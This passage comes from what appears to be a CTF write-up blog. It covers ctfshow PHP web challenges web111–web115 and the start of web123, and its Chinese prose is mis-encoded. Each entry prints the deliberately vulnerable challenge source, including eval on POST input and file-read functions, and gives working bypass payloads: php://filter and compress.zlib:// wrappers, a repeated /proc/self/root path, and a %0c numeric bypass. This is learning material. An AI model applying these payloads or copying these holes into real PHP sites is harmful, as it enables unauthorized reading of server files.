class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜è€ƒçš„å˜é‡è¦†ç›–<br>$GLOBALSÂ â€”Â å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ï¼Œå…³è”æ•°ç»„Â arrayï¼ŒåŒ…å«å½“å‰è„šæœ¬å†…å®šä¹‰æˆå…¨å±€èŒƒå›´çš„æ‰€æœ‰å˜é‡çš„å¼•ç”¨ã€‚ æ•°ç»„çš„é”®å°±æ˜¯å˜é‡çš„åå­—ã€‚</p><p>ç„¶åv1ä¸­è¦æœ‰ctfshowï¼Œåˆ™payloadä¸ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token constant">GLOBALS</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³å¯æ‹¿åˆ°flagï¼šctfshow{a241886a-80f6-42d3-a2f0-ce9a7cd474b1}</p><h4 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHP Filter :PHP è¿‡æ»¤å™¨ç”¨äºå¯¹æ¥è‡ªéå®‰å…¨æ¥æºçš„æ•°æ®ï¼ˆæ¯”å¦‚ç”¨æˆ·è¾“å…¥ï¼‰è¿›è¡ŒéªŒè¯å’Œè¿‡æ»¤ã€‚<br>is_file(): å‡½æ•°æ£€æŸ¥æŒ‡å®šçš„æ–‡ä»¶åæ˜¯å¦æ˜¯æ­£å¸¸çš„æ–‡ä»¶ã€‚(å¦‚æœæ–‡ä»¶å­˜åœ¨ä¸”ä¸ºæ­£å¸¸çš„æ–‡ä»¶ï¼Œåˆ™è¿”å› true)</p><p>é¦–å…ˆä¼šç»è¿‡ifåˆ¤æ–­ï¼Œ!is_file(),ä¹Ÿå°±æ˜¯è¯´ä¸èƒ½æ˜¯æ­£å¸¸çš„æ–‡ä»¶åï¼Œè€Œhighlight_file()åˆå¯ä»¥ç”¨phpä¼ªåè®®è¿›è¡Œç»•è¿‡æ¥è¯»å–ï¼Œpayloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{2922a050-d042-49db-84d7-616e379a3cde}</p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡å¤šäº†ä¸ªfilterï¼Œä¾¿ä¸èƒ½å†ç”¨ä¸Šæ¬¡çš„payloadäº†ï¼Œå»çœ‹äº†çœ‹phpçš„ç›¸å…³èµ„æ–™ï¼Œå‘ç°è¿˜æœ‰å‹ç¼©æµåè®®</p><ul><li>compress.zlib://file.gz</li><li>compress.bzip2://file.bz2</li><li>zip://archive.zip#dir/file.txt<br>æ‰€ä»¥payloadï¼š</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>compress<span class="token operator">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{6eb385d9-3ade-4feb-b809-785d028182f5}<br>ä½†çœ‹ä¸€ä¸ªå¤§ä½¬çš„ç»™å‡ºçš„è§£æ³•ï¼š</p><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¤ªèœï¼Œè¿˜æ˜¯ä¸æ€ä¹ˆæ˜ç™½ï¼Œå…ˆæ¥ç€åšã€‚è§£é‡Šæ˜¯ï¼šè¶…è¿‡20æ¬¡è½¯è¿æ¥åå°±å¯ä»¥ç»•è¿‡is_fileï¼Œåœ¨linuxä¸­/proc/self/rootæ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ls /proc/self/rootï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹ï¼Œå¤šæ¬¡é‡å¤åç»•è¿‡is_fileã€‚</p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ¬¡è™½ç„¶æŠŠå‹ç¼©æµçš„åè®®banäº†ï¼Œä½†æ˜¯å‘ç°filteråè®®åˆè¢«æ”¾äº†å‡ºæ¥ï¼Œæ‰€æœ‰ç›´æ¥æ„é€ payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{a5dcc792-199b-4f4e-9ed7-e1bb379bdc09}</p><h4 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡è„šæœ¬çˆ†ç ´ï¼Œå»å¯»æ‰¾å¯ä»¥ç»•è¿‡çš„å­—ç¬¦ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$a</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_115.png"></p><p>å‘ç°%0Cå¯ä»¥ç»•è¿‡ï¼Œpayloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>num<span class="token operator">=</span><span class="token operator">%</span><span class="token number">0</span>c36<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{811642c6-7bb9-4f2e-81e2-3c98cb6f8915}<br>ï¼ˆé¢˜ä¸­çš„!== è¿›è¡Œæ¯”è¾ƒæ—¶åˆ™ä¸è¿›è¡Œç±»å‹è½¬æ¢ï¼Œè€Œ==æ¯”è¾ƒæ—¶ä¼šè¿›è¡Œç±»å‹è½¬æ¢å†æ¯”è¾ƒï¼‰</p><h4 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆéœ€è¦çŸ¥é“çš„æ˜¯phpå˜é‡åä¸­åªæœ‰å­—æ¯å’Œä¸‹åˆ’çº¿ï¼Œæ²¡æœ‰ç‚¹.ï¼Œè€Œå½“å˜é‡åä¸­æœ‰ç©ºæ ¼ã€+ã€[ æ—¶ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥æŒ‰æ­£å¸¸æ¥è¯´æ— æ³•æ„é€ å‡ºCTF_SHOW.COMå˜é‡ï¼Œä½†å¦‚ä½•å°†ä¸‹åˆ’çº¿_æ¢æˆ[ 